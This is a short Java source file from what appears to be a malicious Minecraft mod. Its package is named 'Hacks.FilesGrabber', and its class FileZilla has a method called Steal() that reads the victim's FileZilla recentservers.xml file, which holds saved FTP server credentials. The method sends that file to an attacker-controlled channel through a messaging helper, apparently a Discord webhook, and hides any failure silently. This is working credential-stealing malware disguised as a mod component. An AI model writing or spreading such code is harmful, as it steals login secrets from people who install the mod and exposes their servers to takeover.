package com.example.examplemod.Hacks.FilesGrabber.FileZilla;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.File;

public class FileZilla {
   public static void Steal() throws Exception {
      try {
         SendMessage.sendFile(new File(System.getProperty("user.home") + "/AppData/Roaming/FileZilla/recentservers.xml"));
         SendMessage.doThing("```FileZilla ^^^```", Cfg.FilesChannel);
      } catch (Exception var1) {
         System.out.println("lol1");
      }

   }
}
